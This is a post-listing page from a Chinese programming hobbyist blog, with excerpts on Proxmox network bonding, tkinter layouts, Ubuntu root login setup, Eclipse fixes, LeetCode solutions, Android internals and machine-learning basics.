<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99ad0979efa46a1db8e6cdee68d109d3/" rel="bookmark">
			Proxmox VE虚拟化从入门到应用实战-服务器管理篇（网络配置2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Proxmox VE虚拟化从入门到应用实战-服务器管理篇（网络配置2）
一、Linux多网口绑定
多网口绑定（也称为网卡组或链路聚合）是一种将多个网卡绑定单个网络设备的技术。利用该技术可以实现某个或多个目标，例如提高网络链容错能力，增加网络通信性能等。
类似光纤通道和光纤交换机这样的高速网络硬件的价格一般都非常昂贵。利用链路聚合技术，将两个物理网卡组成一个逻辑网卡，能够将网络传输速度加倍。大部分交换机设备都已经支持Linux内核的这个特性。如果您的服务器有多个以太网口，你可以将这些网口连接到不同的交换机，以便将故障点分散到不同的网络设备，一旦有物理线路故障或网络设备故障发生，多网卡绑定会自动将通信流量从故障线路切换到正常线路。
链路聚合技术可以有效减少虚拟机在线迁移的时延，并提高Proxmox VE集群服务器节点之间的数据复制速度。
目前一共有7种网口绑定模式：
轮训模式（blance-rr）：网络数据包将按顺序从绑定的第一个网卡到最后一个网卡轮流发送。这种模式可以同时实现负载均衡和链路容错效果。 主备模式（active-backup）:该模式下网卡组中只有一个网卡活动。只有活动的网卡故障时，其他网卡才会启动并接替该网卡的工作。整个网卡组使用其中一块网卡的MAC地址作为对外通信的MAC地址，以避免网络交换机产生混乱。这种模式仅能实现链路容错效果。 异或模式（balance-xor）：网络数据包按照异或策略在网卡组中选择一个网卡发送（[源MAC地址 XOR 目标MAC地址] MOD 网卡组中网卡数量）。对于同一个目标MAC地址，该模式每次都选择使用相同网卡通信。该模式能同时实现负载均衡和链路容错效果。 广播模式（broadcast）：网络数据包会同时通过网卡组中所有网卡发送。该模式能实现链路容错效果。 IEEE 802.3ad动态链路聚合模式（802.3ad）（LACP）：该模式会创建多个速度和双工配置一致的聚合组。并根据802.3ad标准在活动聚合组中使用所有网卡进行通信。 自适应传输负载均衡模式（balance-tlb）：该Linux网卡绑定模式无须交换机支持即可配置使用。根据当前每块网卡的负载情况（根据链路速度计算的相对值），流出的网络数据包流量会自动进行均衡。流入的网络流量将由当前指定的一块网卡接收。如果接收流入流量的网卡故障，会自动重新指定一块网卡接收网络数据包，但该网卡仍沿用之前故障网卡的MAC地址。 自适应负载均衡模式（均衡的IEEE 802.3ad动态链路聚合模式（802.3ad）（LACP）:-alb）：该模式是在blance-tlb模式的基础上结合了IPV4网络流量接收负载均衡（rlb）特性，并且无须网络交换机的专门支持即可配置使用。网络流量接收负载均衡基于ARP协商实现。网卡组驱动将自动截获本机的ARP应答报文，并使用网卡组中其中一块网卡的MAC地址覆盖ARP报文中应答的源MAC地址，从而达到不同的网络通信对端和本机不同MAC地址通信的效果。 示 在网络交换机支持LACP（IEEE 802.3ad）协议的情况下，推荐使用LACP绑定模式（802.3ad），其他情况建议使用active-backup模式。
对于Proxmox集群网络的网卡绑定，目前仅支持active-backup模式，其他模式均不支持。
下面所列的网卡绑定配置示例可用于分布式/共享存储网络配置。其主要优势是能达到更高的传输速度，同时实现网络链路容错的效果。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6fe9680822dba498d755e8e010da972/" rel="bookmark">
			tkinter-place布局详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前文介绍了tkinter中的grid布局，相信对tkinter的布局套路有了进一步的了解。本文将介绍另一种布局类place。
同样，展示布局类与控件类的类间关系：
文章目录 placexyrelxrelywidthheightanchor place place(cnf={}, **kw)
place和其他两种布局方式相比，更加"自由"但是需要做的事情也多。布局一般就是设置子控件相对于父控件的 起始位置、宽和高。在pack、grid的布局方式中，起始位置、宽和高都会给默认配置，所以使用起来会更"简"，代价就是"控制权"减少。所以place虽然"繁"，但完全自主控制。三种布局方式，没有哪种最好，哪种不好，看实际需要求选着合适的即可。
下面，我们先过一遍place的常见属性，展示其含义及用法。
按照之前两篇文章的思路，place()先不传参，直接调用。看看会是什么效果呢？
from tkinter import (Tk, Button) from tkinter.constants import RIGHT, LEFT, X, Y, BOTH main_win = Tk() main_win.title('渔道的grid布局') width = 300 height = 300 main_win.geometry(f'{width}x{height}') # print(main_win.keys()) apple_color = 'Crimson' banana_color = 'Yellow' orange_color = 'Orange' grape_color = 'Purple' fruit = {'apple':'Crimson', 'banana':'Yellow', 'orange':'Orange', 'grape':'Purple'} # 默认显示效果 i = 0 for k,v in fruit.items(): bt = Button(main_win, text=k, fg='black', bg=v) bt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a6fe9680822dba498d755e8e010da972/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5e2680614ed7258ac41c4c200f8bbc9/" rel="bookmark">
			Ubuntu20.04开启root账户
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ubuntu20.04开启root账户 Ubuntu20.04安装完成之后默认是没有root账户登录权限的，按照以下步骤即可实现开机一步完成root账户登录，看完你会不会觉得很方便呢
1. 第一步 以普通用户登录系统，创建root用户的密码
在终端输入命令：sudo passwd root
然后输入设置的密码，输入两次，这样就完成了设置root用户密码了（注意Linux系统下密码是没有回显的）
2. 第二步 修改 50-ubuntu.conf 文件
在终端输入命令：sudo gedit /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf
在文件末尾增加如下两行：
greeter-show-manual-login=true
all-guest=false
3. 第三步 修改 gdm-autologin 文件
在终端输入命令：sudo gedit /etc/pam.d/gdm-autologin 打开文件
前面加 # 注释掉第三行的 auth required pam_succeed_if.so user != root quiet_success
4. 第四步 修改 gdm-password 文件
在终端输入命令：sudo gedit /etc/pam.d/gdm-password 打开文件
前面加 # 注释掉第三行的 auth required pam_succeed_if.so user != root quiet_success
5. 第五步 修改 /root/.profile 文件
在终端输入命令：sudo gedit /root/.profile 打开文件
将文件末尾的 mesg n 2&gt; /dev/null || true 这一行修改成
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5e2680614ed7258ac41c4c200f8bbc9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/125b570ecab55646bce4d98d08ae96b0/" rel="bookmark">
			eclipse快捷键失效的解决措施
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一种 ：很简单的一种方法，我的问题就是这么解决的，把eclipse 当前窗口打开的所以文件窗口全部关闭，重新打开一下就可以使用了，有时候问题解决就这么简单，就不需要再去使用第二种第三种了。
第二种：快捷键只有在Java 编辑模式下才可用，看一下自己的编辑模式是不是没有选Java ，
Window-&gt;Perspective-&gt;Open Perspective-&gt;Java
如果没有Java,选择Other,选择Java
第三种：前两种没有奏效的情况下，可以尝试重置一下快捷键：
eclipse–&gt; window –&gt; preferences –&gt; general –&gt;keys –&gt;Restore Defaults –&gt; Apply and Close
第四种：前三种都不可以的话，那就要检查一下当前运行的软件是不是有快捷键冲突，冲突的话修改一下或者屏蔽掉。
第五种：这是从网上查到的一种方法，我自己也没有尝试，一般不要轻易尝试这种办法，因为这相当于是把eclipse重置了，还要很麻烦的重新去设置，最后真的没有办法了再去尝试。把 eclipse 的工作空间的.metadata文件夹删掉，然后需要自己重新配置。
第六种：次方法用于没有一点提示的情况：依次打开eclipse上面的windows ——preferences ——java ——editor —— content assist ，在右上方有一行“select the proposal kinds contained in the ‘default’ content assist list” 下面，勾选Java Prolosals 复选框，保存退出即可。
第七种：此种方法用于打出单词缩写没有提示的情况（例如：打出syso没有提示）：依次打开eclipse上面的windows ——preferences ——java ——editor —— content assist，在右边部分偏下的地方找到“Auto activation triggers for java:”这一项，后面是一个文本框，在后面的文本框输入字母abcd，然后点击 applay–&gt;OK 保存退出，选择导出 File —— General —— Export 选择preferences 再选中Export all 复选框（下面的不需要管），并指定导出文件的名字和路径（注意只能导出.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/125b570ecab55646bce4d98d08ae96b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/810fc5b753b288e362c63c3529df8260/" rel="bookmark">
			剪刀石头布（map&#43;循环结）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现给出两人的交锋记录，请统计双方的胜、平、负次数，并且给出双方分别出什么手势的胜算最大。
输入格式：
输入第 1 行给出正整数 N（≤10​5​​ ），即双方交锋的次数。随后 N 行，每行给出一次交锋的信息，即甲、乙双方同时给出的的手势。C 代表“锤子”、J 代表“剪刀”、B 代表“布”，第 1 个字母代表甲方，第 2 个代表乙方，中间有 1 个空格。
输出格式：
输出第 1、2 行分别给出甲、乙的胜、平、负次数，数字间以 1 个空格分隔。第 3 行给出两个字母，分别代表甲、乙获胜次数最多的手势，中间有 1 个空格。如果解不唯一，则输出按字母序最小的解。
输入样例：
10
C J
J B
C B
B B
B C
C C
C B
J B
B C
J J
输出样例：
5 3 2
2 3 5
B B
作者
CHEN, Yue
单位
浙江大学
代码长度限制
16 KB
时间限制
200 ms
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/810fc5b753b288e362c63c3529df8260/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d525194a257f6cb3ac3e52302b70d781/" rel="bookmark">
			SystemUI 快速搞懂启动流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		不积跬步无以至千里
SystemUI,系统界面,一个系统级的应用,其中包括了很多功能模块,比如锁屏,状态栏,分屏,音量条,多任务等等,让我们一起看一下它的启动.
随着系统的启动通过调用第一个用户空间的init进程调用Zygote进程然后调用SystemServer启动各种系统服务,而我们的SystemUI在其中启动服务中的一项.
一.SystemServer中的启动
代码路径:
frameworks/base/services/java/com/android/server/SystemServer.java
1.
private void run() { ... //AMS,PWS等等服务 startBootstrapServices(); //电量,WebView更新等等服务 startCoreServices(); //网络,WMS,震动等等服务 startOtherServices(); ... } //其它服务 private void startOtherServices() { ... mActivityManagerService.systemReady(() -&gt; { ... try { startSystemUi(context, windowManagerF); } catch (Throwable e) { reportWtf("starting System UI", e); } ... } ... //启动SystemUI的代码 static final void startSystemUi(Context context, WindowManagerService windowManager) { Intent intent = new Intent(); //指定了包名类名,启动Service intent.setComponent(new ComponentName("com.android.systemui", "com.android.systemui.SystemUIService")); intent.addFlags(Intent.FLAG_DEBUG_TRIAGED_MISSING); //Slog.d(TAG, "Starting service: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d525194a257f6cb3ac3e52302b70d781/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a0e0f0f3266677ae2e405b25e5a6d07/" rel="bookmark">
			使用Endnote出现样式错误的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天使用Endnote插入文献，结果论文中的部分文字变成了以下超链接的地址。
现在记录一下解决方法
将Instant Formatting 由Off设置为On。稍等片刻就变回去了。
不过话说这个功能也挺好，变成超链接的部分正是我在这个地方复制过来的文字，这个功能也是厉害的很。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/786b24022ecb2da00a9d8b3e8e10cf91/" rel="bookmark">
			centos 8设置中文环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考连接
首先查看当前字符集
locale
看看有没有zh_CN.utf8
locale -a |grep CN
没有就安装
yum install -y langpacks-zh_CN
安装后再次确认配置
vi /etc/locale.conf
LANG=“zh_CN.UTF-8”
修改后重启即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d3cd6a29bf14da33780b040152f2afb/" rel="bookmark">
			力扣解题思路：847. 访问所有节点的最短路径
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 847. 访问所有节点的最短路径 思路：此题类似于求最小生成树，要求返回能访问所有结点的最短路径，我们可以把每个点作为出发点，依次访问与该点相连的节点，即使用BFS。-&gt;
我们需要一个用于记录我们是否访问完所有节点的数组（也需要记录已经访问的节点）book，那book的维度如何确定呢？首先从每个节点出发都会保存一个已遍历的节点的数组，所以book应该是一个二维数组，第一个维度即为节点的数目。-&gt;
为了便于统计和更新已访问的节点，我们使用boolean[len][1&lt;&lt;len]用来记录每个点的访问路径的，访问过则将相应二进制位置1 ，在更新时只需要next_state = node[1]|(1&lt;&lt;next)即可完成状态的更新，为了同时将节点下标和节点对应的状态同时放入队列，我们定义队列中每个元素都为2数组（存放节点下标和节点对应的状态），我的代码及详细注解如下:
public int shortestPathLength(int[][] graph) { int len=graph.length; boolean[][] book=new boolean[len][1&lt;&lt;len];//用来记录每个点的访问路径的，访问过则将相应二进制位置1 int k=(1&lt;&lt;len)-1;//全1.代表所有点都访问过（最终状态） Queue&lt;int[]&gt; queue=new LinkedList&lt;&gt;(); for (int i=0;i&lt;len;i++){ queue.offer(new int[]{i,1&lt;&lt;i});//把每个点作为起点，1&lt;&lt;i表示起点位置以访问，置1 } int step=0;//跳数 while (!queue.isEmpty()) { int size=queue.size(); while (size--&gt;0){ int[] node=queue.poll(); if(k==node[1])return step;//到达最终状态，直接返回 for (int next:graph[node[0]])//该点能到达的下一节点 { int next_state=node[1]|(1&lt;&lt;next);//即将访问的下一节点的状态，即把相应二进制位数的下一节点的位置置1，其他保持不变，所以用上了|符号 if(book[next][next_state])continue;//该节点访问过，直接跳过 book[next][next_state]=true;//未访问则标记为已访问 queue.offer(new int[]{next,next_state});//下一节点入队列 } } step++; } return step; } 这里可能有人会问，while循环中return的一定是最小的step吗？？答案是当然，这就是BFS的特性，因为最先return step一定是最小step，每经历一次大循环step将加一，因此第一次返回的总是最小step 。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e6ab313359b2de523b015f51c594ea4/" rel="bookmark">
			tkinter-pack布局详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前面三篇博文介绍了 tkinter-label，tkinter-menu详解，tkinter-button详解，可以说对tkinter的控件有了基础的认识，可能这时大家自然会想，这些控件放置的什么位置要怎样控制呢？为了搞清楚这个问题，接下来分三篇博文来分别介绍tkinter的三种布局方法。
tkinter中控件的布局可以有三个类来控制,分别是Pack,Place,Grid.本系列文章将这三个类统称为布局类.
布局类与控件类的类间关系如下:
由上图可以看出,tkinter总共有17个控件类,三个布局类都是控件类(Widget)的父类.所以任何控件类对象都可以直接调用布局类的方法,来完成控件布局.
文章目录 Pack默认分布紧凑分布填满分布填充分布外边距内边距 Pack widget.pack(cnf={}, **kw)
为了直观起见,接下来主要通过实例来辅助理解pack的布局结构并学会使用。
默认分布 首先，我们从最简单的默认配置入手。
from tkinter import (Tk, Button) from tkinter.constants import RIGHT, LEFT, X, Y, BOTH main_win = Tk() main_win.title('渔道的pack布局') width = 300 height = 300 main_win.geometry(f'{width}x{height}') apple_color = 'Crimson' banana_color = 'Yellow' orange_color = 'Orange' grape_color = 'Purple' fruit = {'apple':'Crimson', 'banana':'Yellow', 'orange':'Orange', 'grage':'Purple'} for k,v in fruit.items(): bt = Button(main_win, text=k, fg='black', bg=v) bt.pack() print(bt.info()) print函数的打印信息如下：
{'in': &lt;tkinter.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e6ab313359b2de523b015f51c594ea4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63768b5825baa3b44167159cec91977b/" rel="bookmark">
			梳理L1、L2与Smooth L1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于L1、L2的范数、损失函数和正则化，之前一直混淆这几个概念，故对这几天看过的资料进行了学习总结。
范数(norm)是数学中的一种基本概念。在泛函分析中，它定义在赋范线性空间中，并满足一定的条件，即①非负性；②齐次性；③三角不等式。它常常被用来度量某个向量空间（或矩阵）中的每个向量的长度或大小。
首先以L2范数为例对范数做一个简单的说明：
L2范数:
假设 X X X是n维的特征 X = ( x 1 , x 2 , x 3 , … , x n ) X=(x_1,x_2,x_3,…,x_n) X=(x1​,x2​,x3​,…,xn​)
则L2范数： ∥ X ∥ 2 = ∑ i = 1 n x i 2 \left \|X\right \|_2=\sqrt{\sum_{i=1}^{n}x_i^2} ∥X∥2​=∑i=1n​xi2​ ​
一、作为损失函数 本部分内容大多来源于回归损失函数1：L1 loss, L2 loss以及Smooth L1 Loss的对比。
公式对比 L 1 L_1 L1​
公式： L 1 = ∣ f ( x ) − Y ∣ L_1=\left|f(x)-Y\right| L1​=∣f(x)−Y∣
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63768b5825baa3b44167159cec91977b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/447cea97b43f02fea7e5f21475dba4f8/" rel="bookmark">
			Android 9 (P)非SDK API限制调用开发指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android 9 (P)非SDK API限制调用开发指南 Android 9 (P)开发适配指南系列博客目录：
Adnroid 9 (P) recovery升级Map of '@/cache/recovery/block.map’failed问题分析指南
Android 9 (P)版本解决VNDK library: XXX’s ABI has EXTENDING CHANGES
Android 9 (P)非SDK API限制调用开发指南
Android 9 (P)适配以太网功能开发指南
Android 9 (P)在user模式下无法使用fastboot烧录怎么破
Android 9 (P)静默安装/卸载App适配终极指南
引言 有过Android开发经验的童鞋应该知道，每一次Android大版本的升级，往往会有大量的APP出现兼容性问题，导致这个情况的主要原因是由于APP的热修复以及依赖Android internal API(内部API)，也就是非SDK API。这些API是指标记@hide的类、方法以及字段，它们不属于官方Android SDK的字段与函数(当然这其中也包括一些废旧SDK的使用,这个不是本篇讨论的重点)。
非SDK接口指不在官方Android SDK涵盖范围内的 Java 字段和方法。此类接口是 SDK 的内部实现细节，可能随时会被修改，且不对开发者另行通知。 Google希望未来Android大版本升级，APP都能正常运行，而很多APP对内部API的调用通过反射或JNI间接调用的方法来调用，破坏兼容性。 为此Google从Android P开始限制对内部API的使用，继续使用则抛出如下异常。
Google在Android P版本上对隐藏的Java API进行了一定的限制，后续版本会逐步的完善限制。App侧通过反射等方式调用的Java API将会有很多限制，对于Android应用想再搞一些插件化之类的黑科技便是带着脚手铐跳舞，即便能跳但舞姿已不太优雅了。这也是为了Android 生态在未来更好的发展。真是为难了谷歌妈咪为了Android的和谐发展所做的努力。
Android 7.0对Native的NDK的调用限制是手铐，而Android 9.0对Java层SDK的调用限制就是脚铐。脚铐手铐同时上，为了Android碎片化的整理真是操作了心啊。
注意：本文是以Android 9源码为基础来说明Android P对非SDK API调用开发指南。
libcore/ojluni/src/main/java/java/lang/Class.java art/runtime/native/java_lang_Class.cc art/runtime/hidden_api.h art/runtime/runtime.h art/libdexfile/dex/hidden_api_access_flags.h art/runtime/hidden_api.cc art/runtime/art_method-inl.h frameworks/base/core/java/android/content/pm/ApplicationInfo.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/447cea97b43f02fea7e5f21475dba4f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd27e67bb342d52624cb150c812dfb72/" rel="bookmark">
			95-110-026-源码-Env-RemoteStreamEnvironment
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.视界 2.拓扑图 3.概述 待补充
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a74446061ec67d2710bd1c86195f9c0/" rel="bookmark">
			【拉普拉斯变换】3. 拉普拉斯逆变换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 【 1. 查表法 】【 2. 部分分式展开法 】1. F(s)有单极点（特征根为单根）2. F(s)有共轭单极点（特征根为共轭单根） 我们根据拉普拉斯逆变换的定义式 去解太麻烦了，一般我们用部分分式展开法、查表法求拉普拉斯逆变换。 【 1. 查表法 】 例：
【 2. 部分分式展开法 】 1. F(s)有单极点（特征根为单根） 系数 Ki 的求解： 2. F(s)有共轭单极点（特征根为共轭单根） 例：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77156a9cf4702c9304702f073685be45/" rel="bookmark">
			Python cp36 cp 什么意思？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		cp 代表 CPython，表示用 C 语言写的 Python 解释器版本。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc3427e81af55216aa4cc10ffb82fc56/" rel="bookmark">
			力扣解题思路：股票问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		121. 买卖股票的最佳时机 思路：这题为简单题，只要记录前面的最小价格，将这个最小价格作为买入价格，然后将当前的价格作为售出价格，查看当前收益是不是最大收益。 class Solution { public int maxProfit(int[] prices) { if(prices.length == 0) return 0; int max = 0; int min = prices[0]; for(int i=1;i&lt;prices.length;i++){ if(min&gt;prices[i]){ min = prices[i]; continue; } max = Math.max(max,prices[i]-min); } return max; } } 122. 买卖股票的最佳时机 II 思路：为上一题的简单扩展，可以多次买卖，可以联想到贪心策略。当prices[i] - prices[i-1] &gt; 0，那么就把 prices[i] - prices[i-1] 添加到收益中，这样的贪心策略是否是正确的呢？-&gt; 可以通过简单的证明：对于 [a, b, c, d]，如果有 a &lt;= b &lt;= c &lt;= d ，那么最大收益为 d - a。而 d - a = (d - c) + (c - b) + (b - a) ，因此当访问到一个 prices[i] 且 prices[i] - prices[i-1] &gt; 0，那么就把 prices[i] - prices[i-1] 添加到收益中，这样的累计收益是最大的。 代码如下： public int maxProfit(int[] prices) { int profit = 0; for (int i = 1; i &lt; prices.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc3427e81af55216aa4cc10ffb82fc56/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/430f4524a15209c77028a30fb61aa9aa/" rel="bookmark">
			美团，滴滴，蘑菇街Java大数据面经分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大概校招的时候面了几家互联网公司，主要方向是java后端和大数据开发，最近整理下发出来
美团 一面
聊你最熟悉的项目和技术。项目中为什么要使用spark。spark怎么划分stage，宽窄依赖，聊源码spark提交一个作业的执行流程（单机模式）spark driver节点，worker以及master节点遇到故障如何解决。spark checkpoint原理聊JVM内存划分与GC算法。JVM中为什么需要使用分代收集算法，有什么好处。手撕代码：
输入一个链表和一个定值x，要求将值小于x的所有节点置换到x的左侧，值大于x的所有节点置换到x右侧，另外需要保持原有前后关系。比如：
输入： 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2 and x = 3,
输出： 1-&gt;2-&gt;2-&gt;3-&gt;4-&gt;5.
其中：1/2/2小于3，4/5大于3，而且输入的前后顺序也是1/2/2,4/5 一面刚开始是分布式存储团队，主要技术栈是hadoop，hbase以及hive，后来感觉我对分布式计算感兴趣，面试官帮我转岗到实时计算组，接着二面。
二面
自我介绍聊项目，项目中有哪些难点，解决了什么问题？spark streaming集群如何做容灾处理。spark checkpoint原理。了解哪些海量数据去重的方法。flink和spark的区别？flink了解哪些，它的基本架构原理如何设计一个多级缓存系统，需要考虑到哪些问题？redis和zookeeper做分布式锁的区别，还有其他方式做分布式锁吗？一道算法：给定一个栈，使用O(1)的时间复杂度计算栈中的最小元素。了解哪些机器学习算法？做过相关项目吗？团队间协作需要注意哪些问题？如何后面让你做同样的一个系统，你会从之前的项目中吸取怎么样的经验。 三面
自我介绍深挖项目。如何理解大数据，它解决了什么问题。在一个很大的m*n的数组中，每一行有序，每一列无序，如何求其topk。进程之间如何通信。操作系统页的概念，每一页的大小是多少，为什么是这么多。一台机器可以建立的连接是否是无限的，影响它的因素有哪些？TCP断开连接时的time_wait状态？确定一个TCP连接的5元组。还有什么向问我的嘛？如何理解实时计算。 过了几天，问了下，说是没HC了，给我转分布式存储，不过需要重新面试，就没再继续面了。
滴滴（面试通过） 一面
自我介绍介绍项目。说说JVM gc算法，垃圾回收器。聊下java并发包的一些常用工具类聊spark源码。有什么想问的。 二面
redis的工作模型。redis如何处理过期数据。redis中hash类型求数据大小快还是将所有数据读出来快。数据库与缓存读写一致性问题。如果以上问题回答的不太完美，你会怎么办。spark的通信模型，集群发生故障是怎么办。spark的执行流程。java中有哪些锁。synchronized为什么是重量级锁。如果工作中提出不合理的需求你会怎么办。怎么看待加班。实习时间。 过了几天面试官说面试通过，过几天老板会和我商量入职时间，然后过了几天。。。。HC被锁了。。
蘑菇街（offer） 一面
项目介绍，项目中的难点与亮点spark sql的UDF，UDAF函数的实现。Hive中如何实现UDF。hashmap源码中有哪些成员变量，什么时候适合增大负载因子，什么时候适合减小。java中float类型，类型转换。字符串的匹配。 二面
自我介绍java中有哪些锁java CAS，看过native方法源码没有什么是死锁，代码中出现了死锁怎么解决。求一颗二叉树中topk大的元素。java volatile关键字。spark执行流程。如何解决数据倾斜。实习时间，倾向的岗位。 三面
你有哪些优势大学期间对你影响最大的人你有哪些优点和缺点。对前面的面试自我感觉怎么样。期望薪资实习时间。 最终拿到offer。
总结： 菜是原罪！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00f3962b2b2a896b9e73dbbb19bd594e/" rel="bookmark">
			【大数据开发】Java语言基础——作业day03
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.图形打印（每一个图形都需要单独设计一个方法）（注：这是四个题） class Demo12 { public static void main(String[] args) { for (int i=1; i&lt;=5; i++) { for (int j=0; j&lt;i-1;j++) { System.out.print(" "); } System.out.println("*****"); } } } class Demo13 {//0 2 4 6 8 //1 2 3 4 5 //9 7 5 3 1 //0 1 2 3 4 public static void main(String[] args) { for (int i=0; i&lt;5; i++) { //打印空格 for (int j=0; j&lt;i; j++) { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/00f3962b2b2a896b9e73dbbb19bd594e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d17eafdbf03f3826c13bdc536d91196/" rel="bookmark">
			归一化的作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先，归一化是把数据转化为（0，1）或者是（-1，1）之间。（-1，1）： (x-xmax)/(xmax-xmin)
标准化是把数据转化到均值为0，方差为1.
中心化：平均值为0，对标准差无要求
三种归一化方法：除以序列最大值的，叫峰归一化；
除以序列之和的，叫面积归一化；
除以序列的模，叫数值归一化，得到序列的方差为0，均值为1；
1.图像：
基本上归一化思想是利用图像的不变矩寻找一组参数使其能够消除其他变换函数对图像变换的影响。也就是转换成唯一的标准形式以抵抗仿射变换
图像归一化使得图像可以抵抗几何变换的攻击，它能够找出图像中的那些不变量，从而得知这些图像原本就是一样的或者一个系列的。
2.matlab里图像数据有时候必须是浮点型才能处理，而图像数据本身是0-255的UNIT型数据所以需要归一化，转换到0-1之间。
3.归一化是一种简化计算的方式，即将有量纲的表达式，经过变换，化为无量纲的表达式，成为纯量。
目的是为了：
(1).避免具有不同物理意义和量纲的输入变量不能平等使用
(2).bp中常采用sigmoid函数作为转移函数，归一化能够防止净输入绝对值过大引起的神经元输出饱和现象
(3).保证输出数据中数值小的不被吞食
